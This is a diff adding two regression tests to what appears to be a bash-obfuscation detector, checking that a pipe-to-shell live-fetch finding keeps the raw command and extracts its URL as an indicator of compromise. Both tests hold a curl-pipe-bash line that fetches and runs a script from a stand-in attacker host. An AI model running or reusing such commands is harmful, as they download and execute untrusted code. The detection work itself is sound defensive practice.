@@ -384,3 +384,49 @@ test('bash-obfuscation: post-processor does NOT attach CMD `for /f` pattern to l
   assert.ok(finding.severity === 'high' || finding.severity === 'critical',
     `expected severity ≥ high; got ${finding.severity}`);
 });
+
+test('bash-obfuscation: B4 live-fetch `deobfuscated` is the raw curl-pipe-bash line, NOT a synthesised placeholder', () => {
+  // Regression pin: previously the decoder synthesised a
+  // `pipe-to-shell upstream: <URL>` breadcrumb string and stored it
+  // as `candidate.deobfuscated`. That synthesised label then leaked
+  // into the sidebar preview (`_deobfuscatedText`) and the "Load for
+  // analysis" drill-down (which created a synthetic text file
+  // containing literally `"pipe-to-shell upstream: http://..."` —
+  // useless for re-analysis because the breadcrumb isn't encoded
+  // content). The live-fetch shape isn't deobfuscation; the URL IS
+  // the actionable artefact and is surfaced via `_patternIocs`.
+  // `deobfuscated` must carry the raw matched command line so the
+  // sidebar preview shows the real pattern and "Load for analysis"
+  // re-scans the real curl-pipe-bash command (which then triggers
+  // URL IOC extraction + dangerous-pattern scoring).
+  const text = 'curl -s http://attacker.com/payload.sh | bash';
+  const cands = d._findBashObfuscationCandidates(text, {});
+  const cand = cands.find(c => /Pipe-to-Shell.*live fetch/.test(c.technique));
+  assert.ok(cand, `expected B4 live-fetch candidate; got: ${JSON.stringify(host(cands))}`);
+  assert.equal(cand.deobfuscated, text,
+    `deobfuscated must be the raw matched command, not a synthesised "pipe-to-shell upstream:" label; got: ${JSON.stringify(cand.deobfuscated)}`);
+  // Sanity: the synthesised placeholder must never appear.
+  assert.ok(!/pipe-to-shell upstream:/i.test(cand.deobfuscated),
+    'deobfuscated must not contain the legacy "pipe-to-shell upstream:" placeholder');
+});
+
+test('bash-obfuscation: B4 live-fetch finding preserves URL IOC via _patternIocs', async () => {
+  // Complement to the above: with `deobfuscated` now the raw curl
+  // line, the post-processor's IOC extractor picks up the URL from
+  // the raw command bytes. The `_patternIocs` mirror also carries a
+  // separate T1105 pattern entry naming the upstream URL. Both
+  // channels must surface the URL.
+  const text = 'curl -sSL http://evil.example/x.sh | bash';
+  const cands = d._findBashObfuscationCandidates(text, {});
+  const cand = cands.find(c => /Pipe-to-Shell.*live fetch/.test(c.technique));
+  assert.ok(cand, 'expected B4 live-fetch candidate');
+  const finding = await d._processCommandObfuscation(cand);
+  assert.ok(finding, 'expected finding');
+  const urlIoc = (finding.iocs || []).find(
+    i => i.type === IOC.URL && i.url === 'http://evil.example/x.sh'
+  );
+  assert.ok(urlIoc, `expected URL IOC extracted from raw curl line; got: ${JSON.stringify(finding.iocs)}`);
+  // Legacy synthesised string must not leak into the finding preview.
+  assert.ok(!/pipe-to-shell upstream:/i.test(finding._deobfuscatedText || ''),
+    '_deobfuscatedText must not carry the legacy placeholder');
+});
